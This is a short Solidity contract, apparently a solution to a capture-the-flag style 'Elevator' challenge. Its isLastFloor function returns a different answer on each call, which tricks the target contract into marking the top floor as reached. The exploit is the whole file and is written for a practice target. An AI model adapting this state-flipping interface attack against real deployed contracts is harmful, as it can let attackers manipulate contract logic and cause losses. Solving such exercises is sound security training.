// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator public elevator;
    bool public lastFloorFlag = true;
    
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    
    function attack() public {
        lastFloorFlag = true;
        goTo();
    }
    
    function isLastFloor(uint) external override returns (bool) {
        lastFloorFlag = !lastFloorFlag;
        return lastFloorFlag;
    }
    
    function goTo() private {
        elevator.goTo(1);
    }
}